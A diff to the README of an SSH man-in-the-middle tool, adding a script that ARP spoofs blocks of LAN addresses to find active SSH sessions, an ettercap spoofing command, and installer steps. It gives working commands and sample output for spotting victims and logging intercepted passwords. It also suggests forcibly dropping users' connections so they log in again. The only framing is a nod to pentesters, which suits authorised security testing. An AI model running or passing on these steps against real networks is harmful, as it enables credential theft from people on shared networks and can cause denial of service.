@@ -15,7 +15,7 @@ Of course, the victim's SSH client will complain that the server's key has chang
 ## Change Log
 
 * v1.0: May 16, 2017: Initial revision.
-* v1.1: ???, 2017: Removed root privilege dependencies, added Kali Linux support.
+* v1.1: ???, 2017: Removed root privilege dependencies, added automatic installer, added Kali Linux support, added JoesAwesomeSSHMITMVictimFinder.py script to find potential targets on a LAN.
 
 
 ## To Do
@@ -32,7 +32,32 @@ The following list tracks areas to improve:
 As root, run the *install.sh* script.  This will install prerequisites from the repositories, download the OpenSSH archive, verify its signature, compile it, and initialize a non-privileged environment to execute from.
 
 
+## Finding Targets
+
+The *JoesAwesomeSSHMITMVictimFinder.py* script makes finding targets on a LAN very easy.  It will ARP spoof a block of IPs and sniff for SSH traffic for a short period of time before moving on to the next block.  Any ongoing SSH connections originating from devices on the LAN are reported.
+
+By default, *JoesAwesomeSSHMITMVictimFinder.py* will ARP spoof and sniff only 5 IPs at a time for 20 seconds before moving onto the next block.  These parameters can be tuned, though a trade-off exists: the more IPs that are spoofed at a time, the greater the chance you will catch an ongoing SSH connection, but also the greater the strain you will put on your puny network interface.  Under too high of a load, your interface will start dropping frames, causing a denial-of-service and greatly raising suspicions (this is bad).  The defaults shouldn't cause problems in most cases, though it'll take longer to find targets.  The block size can be safely raised on low-utilization networks.
+
+Example:
+
+    # ./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s3 --ignore-ips 10.11.12.50,10.11.12.53
+    Found local address 10.11.12.141 and adding to ignore list.
+    Using network CIDR 10.11.12.141/24.
+    Found default gateway: 10.11.12.1
+    IP blocks of size 5 will be spoofed for 20 seconds each.
+    The following IPs will be skipped: 10.11.12.50 10.11.12.53 10.11.12.141
+
+
+    Local clients:
+      * 10.11.12.70 -> 174.129.77.155:22
+      * 10.11.12.43 -> 10.11.99.2:22
+
+The above output shows that two devices on the LAN have created SSH connections (10.11.12.43 and 10.11.12.70); these can be targeted for a man-in-the-middle attack.  Note, however, that in order to potentially intercept credentials, you'll have to wait for them to initiate a new connection.  Impatient pentesters may opt to forcefully close existing SSH connections, to prompt users to create new ones immediately...
+
+
 ## Running The Attack
+
+0.) Run the *install.sh* script, as mentioned above (this only needs to be done once).
 
 1.) Run *sshd_mitm*:
 
@@ -51,6 +76,10 @@ As root, run the *install.sh* script.  This will install prerequisites from the 
 4.) ARP spoof a target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):
 
     arpspoof -r -t 192.168.x.1 192.168.x.5
+
+Alternatively, you can use the *ettercap* tool:
+
+    ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//
 
 5.) Monitor *auth.log*.  Intercepted passwords will appear here:
 
